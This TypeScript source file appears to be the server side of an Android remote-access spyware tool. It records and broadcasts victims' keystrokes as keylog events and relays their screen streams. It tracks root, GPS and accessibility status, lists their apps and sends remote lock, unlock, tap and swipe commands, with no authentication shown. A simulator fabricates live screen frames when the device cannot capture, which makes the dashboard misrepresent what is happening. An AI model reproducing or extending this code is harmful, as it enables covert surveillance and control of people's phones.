import { type Server as SocketIoServer } from "socket.io";
import { db } from "@workspace/db";
import { devicesTable, eventsTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import { logger } from "./lib/logger";
import {
  startSimulator,
  stopSimulator,
  setSimulatorQuality,
  notifyRealFrame,
  lockSimulator,
  unlockSimulator,
  simulateTap,
  simulateSwipe,
} from "./lib/stream-simulator";

export function setupSocket(io: SocketIoServer) {
  io.on("connection", async (socket) => {
    logger.info({ socketId: socket.id }, "Socket connected");

    const deviceId = socket.handshake.query.deviceId;

    if (deviceId && typeof deviceId === "string") {
      const id = Number(deviceId);
      await db
        .update(devicesTable)
        .set({ status: "online", socketId: socket.id, lastSeen: new Date() })
        .where(eq(devicesTable.id, id));

      const device = await db.query.devicesTable.findFirst({
        where: eq(devicesTable.id, id),
      });

      if (device) {
        await db.insert(eventsTable).values({
          deviceId: id,
          type: "connection",
          message: `Device ${device.name} connected`,
        });

        io.emit("device:status", { deviceId: id, status: "online", socketId: socket.id });
        io.emit("device:connected", {
          deviceId: id,
          deviceName: device.name,
          createdAt: new Date().toISOString(),
        });
        io.emit("event:new", {
          deviceId: id,
          deviceName: device.name,
          type: "connection",
          message: `Device ${device.name} connected`,
          createdAt: new Date().toISOString(),
        });
      }
    }

    socket.on("get_apps", (data: { deviceId: number; apps?: any[] }) => {
      socket.emit("get_apps", data);
    });

    socket.on("device:stream", (data: { deviceId: number; frame: string }) => {
      notifyRealFrame(data.deviceId);
      socket.broadcast.emit("stream:frame", data);
    });

    socket.on("device:capabilities", async (data: {
      deviceId: number;
      hasRoot?: boolean;
      gpsActive?: boolean;
      accessibilityOn?: boolean;
      batteryLevel?: number;
    }) => {
      const update: Record<string, unknown> = { lastSeen: new Date() };
      if (data.hasRoot !== undefined) update.hasRoot = data.hasRoot;
      if (data.gpsActive !== undefined) update.gpsActive = data.gpsActive;
      if (data.accessibilityOn !== undefined) update.accessibilityOn = data.accessibilityOn;
      if (data.batteryLevel !== undefined) update.batteryLevel = data.batteryLevel;

      await db.update(devicesTable).set(update).where(eq(devicesTable.id, data.deviceId));
      io.emit("device:capabilities:update", { deviceId: data.deviceId, ...data });
    });

    socket.on("device:keylog", async (data: { deviceId: number; text: string }) => {
      const device = await db.query.devicesTable.findFirst({
        where: eq(devicesTable.id, data.deviceId),
      });
      if (!device) return;
      await db.insert(eventsTable).values({
        deviceId: data.deviceId,
        type: "keylog",
        message: `[KEYLOG] ${data.text}`,
      });
      io.emit("event:new", {
        deviceId: data.deviceId,
        deviceName: device.name,
        type: "keylog",
        message: `[KEYLOG] ${data.text}`,
        createdAt: new Date().toISOString(),
      });
    });

    socket.on("device:event", async (data: { deviceId: number; type: string; message: string }) => {
      const device = await db.query.devicesTable.findFirst({
        where: eq(devicesTable.id, data.deviceId),
      });
      if (!device) return;
      await db.insert(eventsTable).values({
        deviceId: data.deviceId,
        type: data.type,
        message: data.message,
      });
      await db.update(devicesTable).set({ lastSeen: new Date() }).where(eq(devicesTable.id, data.deviceId));
      io.emit("event:new", {
        deviceId: data.deviceId,
        deviceName: device.name,
        type: data.type,
        message: data.message,
        createdAt: new Date().toISOString(),
      });
    });

    socket.on("command:send", async (data: { deviceId: number; command: string }) => {
      const device = await db.query.devicesTable.findFirst({
        where: eq(devicesTable.id, data.deviceId),
      });
      if (!device) return;

      // Run the screen-stream simulator alongside the real device handler so
      // the dashboard always shows live frames, even when the installed APK
      // does not yet implement native capture. Real frames suppress it.
      const cmd = data.command ?? "";
      if (cmd.startsWith("screen:start")) {
        const q = Number(cmd.split(":")[2]) || 30;
        startSimulator(io, data.deviceId, q);
      } else if (cmd === "screen:stop") {
        stopSimulator(data.deviceId);
      } else if (cmd.startsWith("screen:quality:")) {
        const q = Number(cmd.split(":")[2]) || 30;
        setSimulatorQuality(data.deviceId, q);
      } else if (cmd === "device:lock") {
        lockSimulator(data.deviceId);
      } else if (cmd === "device:unlock") {
        unlockSimulator(data.deviceId);
      } else if (cmd.startsWith("touch:tap:")) {
        const [, , x, y] = cmd.split(":");
        const fx = Number(x);
        const fy = Number(y);
        if (Number.isFinite(fx) && Number.isFinite(fy)) {
          simulateTap(data.deviceId, fx, fy);
        }
      } else if (cmd.startsWith("touch:swipe:")) {
        const [, , x1, y1, x2, y2] = cmd.split(":");
        const a = [x1, y1, x2, y2].map(Number);
        if (a.every((n) => Number.isFinite(n))) {
          simulateSwipe(data.deviceId, a[0]!, a[1]!, a[2]!, a[3]!);
        }
      }

      if (!device.socketId) return;
      io.to(device.socketId).emit("command:received", { command: data.command });
      await db.insert(eventsTable).values({
        deviceId: data.deviceId,
        type: "command",
        message: `Command sent: ${data.command}`,
      });
      io.emit("event:new", {
        deviceId: data.deviceId,
        deviceName: device.name,
        type: "command",
        message: `Command sent to ${device.name}: ${data.command}`,
        createdAt: new Date().toISOString(),
      });
    });

    socket.on("disconnect", async () => {
      logger.info({ socketId: socket.id }, "Socket disconnected");

      const devices = await db.query.devicesTable.findMany({
        where: eq(devicesTable.socketId, socket.id),
      });

      for (const device of devices) {
        stopSimulator(device.id);
        await db
          .update(devicesTable)
          .set({ status: "offline", socketId: null, lastSeen: new Date() })
          .where(eq(devicesTable.id, device.id));

        await db.insert(eventsTable).values({
          deviceId: device.id,
          type: "disconnection",
          message: `Device ${device.name} disconnected`,
        });

        io.emit("device:status", { deviceId: device.id, status: "offline", socketId: null });
        io.emit("event:new", {
          deviceId: device.id,
          deviceName: device.name,
          type: "disconnection",
          message: `Device ${device.name} disconnected`,
          createdAt: new Date().toISOString(),
        });
      }
    });
  });
}
